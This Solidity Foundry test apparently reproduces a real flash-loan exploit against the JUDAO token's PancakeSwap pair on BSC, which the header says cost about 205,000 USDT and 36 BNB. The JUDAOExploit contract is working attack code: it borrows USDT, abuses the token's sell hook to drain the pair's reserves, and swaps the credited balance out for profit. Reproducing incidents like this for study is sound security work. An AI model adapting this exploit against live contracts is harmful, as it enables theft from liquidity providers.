// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 205,259.49 USDT + 36 BNB
// Attacker : 0x5384b34c74024d6563b323351a4bbfa18432161b
// Attack Contract : 0x530904b5b5ec86cca0528a682614f57f87e7f079
// Vulnerable Contract : 0xf55dff7898930a2d28cdbc39d615b1624ac86888
// Attack Tx : https://bscscan.com/tx/0x956e38b8ddb40ba080c8042c685ae52ee5c1b096f1d7f0c4a6c59be3eb4265bd

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0xf55dff7898930a2d28cdbc39d615b1624ac86888#code

// @Analysis
// Twitter Guy : https://t.me/defimon_alerts/2955
//
// JUDAO's sell transfer hook drains JUDAO directly from its Pancake pair. The attacker bought JUDAO with
// flash-loaned USDT, sold into the pair to trigger both sync(true) mining and isBurnPair reserve burns,
// then directly swapped the JUDAO balance credited to the pair for excess USDT.

address constant ATTACKER = 0x5384B34C74024d6563B323351a4bBFA18432161B;
address constant JUDAO = 0xf55DFF7898930a2D28cDbC39D615b1624ac86888;
address constant USDT_TOKEN = 0x55d398326f99059fF775485246999027B3197955;
address constant WBNB_TOKEN = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
address constant JUDAO_USDT_PAIR = 0x5D7b61e91cB59E90f7fAE8d0FE2e73976161592F;
address constant MOOLAH = 0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C;
address payable constant PANCAKE_ROUTER = payable(0x10ED43C718714eb63d5aA57B78B54704E256024E);

interface IMoolah {
    function flashLoan(
        address token,
        uint256 assets,
        bytes calldata data
    ) external;
}

interface IMoolahFlashLoanCallback {
    function onMoolahFlashLoan(
        uint256 assets,
        bytes calldata data
    ) external;
}

interface IJUDAO is IERC20 {
    function basePair() external view returns (address);
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 95_070_973;
        vm.createSelectFork("bsc", forkBlock);
        fundingToken = USDT_TOKEN;
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(JUDAO, "JUDAO");
        vm.label(USDT_TOKEN, "USDT");
        vm.label(WBNB_TOKEN, "WBNB");
        vm.label(JUDAO_USDT_PAIR, "JUDAO/USDT Pancake pair");
        vm.label(MOOLAH, "Moolah flash loan proxy");
        vm.label(PANCAKE_ROUTER, "Pancake router");
    }

    function testExploit() public balanceLog {
        vm.deal(ATTACKER, 0);
        uint256 usdtBefore = IERC20(USDT_TOKEN).balanceOf(ATTACKER);
        uint256 bnbBefore = ATTACKER.balance;

        JUDAOExploit exploit = new JUDAOExploit(ATTACKER);

        vm.prank(ATTACKER);
        exploit.attack();

        uint256 usdtProfit = IERC20(USDT_TOKEN).balanceOf(ATTACKER) - usdtBefore;
        uint256 bnbProfit = ATTACKER.balance - bnbBefore;

        logTokenBalance(USDT_TOKEN, ATTACKER, "Attacker Final");
        emit log_named_decimal_uint("Attacker Final BNB Balance", ATTACKER.balance, 18);
        assertGt(usdtProfit, 200_000 ether, "USDT profit");
        assertEq(bnbProfit, 36 ether, "BNB profit");
    }
}

contract JUDAOExploit is IMoolahFlashLoanCallback {
    IJUDAO private constant judao = IJUDAO(JUDAO);
    IERC20 private constant usdt = IERC20(USDT_TOKEN);
    IPancakePair private constant judaoPair = IPancakePair(JUDAO_USDT_PAIR);
    IMoolah private constant moolah = IMoolah(MOOLAH);
    IPancakeRouter private constant router = IPancakeRouter(PANCAKE_ROUTER);

    address private immutable profitReceiver;

    constructor(
        address receiver
    ) {
        profitReceiver = receiver;
        usdt.approve(PANCAKE_ROUTER, type(uint256).max);
        usdt.approve(MOOLAH, type(uint256).max);
        judao.approve(PANCAKE_ROUTER, type(uint256).max);
    }

    function attack() external {
        require(msg.sender == profitReceiver, "only receiver");
        require(judao.basePair() == JUDAO_USDT_PAIR, "unexpected base pair");
        require(judaoPair.token0() == USDT_TOKEN && judaoPair.token1() == JUDAO, "unexpected token order");

        (, uint112 judaoReserve,) = judaoPair.getReserves();
        uint256 targetJudaoOut = uint256(judaoReserve) / 6;

        address[] memory buyPath = new address[](2);
        buyPath[0] = USDT_TOKEN;
        buyPath[1] = JUDAO;
        uint256 flashAmount = router.getAmountsIn(targetJudaoOut, buyPath)[0];

        // step 1: borrow enough USDT from Moolah to buy roughly one sixth of JUDAO pair reserves.
        moolah.flashLoan(USDT_TOKEN, flashAmount, "");

        // step 6: mirror the trace by converting exactly 36 BNB, then forward residual USDT.
        address[] memory bnbPath = new address[](2);
        bnbPath[0] = USDT_TOKEN;
        bnbPath[1] = WBNB_TOKEN;
        router.swapTokensForExactETH(36 ether, usdt.balanceOf(address(this)), bnbPath, profitReceiver, block.timestamp);

        usdt.transfer(profitReceiver, usdt.balanceOf(address(this)));
    }

    function onMoolahFlashLoan(
        uint256 assets,
        bytes calldata
    ) external override {
        require(msg.sender == MOOLAH, "not Moolah");

        // step 2: buy JUDAO; JUDAO's buy branch records this contract's tOwnedU credit.
        address[] memory buyPath = new address[](2);
        buyPath[0] = USDT_TOKEN;
        buyPath[1] = JUDAO;
        router.swapExactTokensForTokens(assets, 0, buyPath, address(this), block.timestamp);

        // step 3: send the post-fee JUDAO balance to the pair. The token sell hook drains pair reserves.
        uint256 sellAmount = judao.balanceOf(address(this));
        judao.transfer(JUDAO_USDT_PAIR, sellAmount);

        // step 4: directly swap the JUDAO now credited to the pair for USDT using Pancake's 0.25% fee.
        (uint112 reserveUsdt, uint112 reserveJudao,) = judaoPair.getReserves();
        uint256 amountIn = judao.balanceOf(JUDAO_USDT_PAIR) - uint256(reserveJudao);
        uint256 amountOut = getAmountOut(amountIn, uint256(reserveJudao), uint256(reserveUsdt));
        judaoPair.swap(amountOut, 0, address(this), "");

        // step 5: Moolah pulls the flash-loaned principal after this callback returns.
        require(usdt.balanceOf(address(this)) >= assets, "insufficient repayment");
    }

    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) private pure returns (uint256) {
        uint256 amountInWithFee = amountIn * 9975;
        return (amountInWithFee * reserveOut) / (reserveIn * 10_000 + amountInWithFee);
    }
}
